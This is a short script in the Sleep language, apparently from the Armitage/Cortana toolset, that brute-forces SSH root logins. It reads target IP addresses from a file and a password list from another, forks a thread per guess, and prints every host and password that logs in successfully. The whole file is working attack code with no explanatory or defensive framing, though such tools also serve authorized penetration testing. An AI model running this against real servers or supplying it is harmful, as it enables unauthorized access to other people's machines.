#
# this script guesses credentials.
#

include("lib/ssh.sl");

debug(7 | 34);

sub test {
	local('$session $exception');
	try {
		$session = ssh_connect($user => 'root', $pass => "$2", $host => $1);
		ssh_close($session);
		acquire($lock);
		println("$host $+ \t $+ $2");
		release($lock);
	}
	catch $exception {
	}
}

sub crack {
	local('$cred');
	foreach $cred ($creds) {
		fork({
			test($host, $cred);
		}, $cred => "$cred", \$host, \$lock);
	}
}

sub main {
	local('$handle $creds $text $lock');
	$creds = map({ return [$1 trim]; }, `cat resources/credentials.txt`);
	$lock = semaphore();

	$handle = openf("tmp/ips.txt");
	while $text (readln($handle)) {
		fork(&crack, $host => [$text trim], \$creds, \$lock);
	}
	closef($handle);
}

invoke(&main, @ARGV);
